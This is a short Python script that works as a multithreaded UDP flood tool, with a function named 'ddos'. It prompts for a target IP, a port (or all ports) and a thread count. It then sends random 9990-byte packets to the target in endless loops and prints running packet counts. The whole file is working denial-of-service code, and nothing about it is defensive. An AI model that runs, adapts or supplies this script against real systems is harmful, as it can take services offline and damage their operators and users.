import os
import random
import socket
import threading

ip=input("Enter the IP: ")
port=int(input("Enter the desired port or press -1 for all ports: "))
threads=int(input("Enter the number of threads: "))

#socket connection provides two nodes, one to listen on and the other to connect.AF_INET indicates ipv4 while SOCK_DGRAM indicates UDP connection.
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes=random._urandom(9990)

def ddos(ip, port, thread):
    c=0
    while True:
        if port==int(-1):
            total= int(65534)
            for p in range(1,total):
                s.sendto(bytes, (ip,p))
                c=c+1
                print(f"Sent {c} packets to {ip} via thread {thread}")
        else:    
            s.sendto(bytes, (ip,port))
            c=c+1
            print(f"Sent {c} packets to {ip} via thread {thread}")

for thread in range(threads):
    threading.Thread(target=ddos, args=(ip,port,thread)).start()
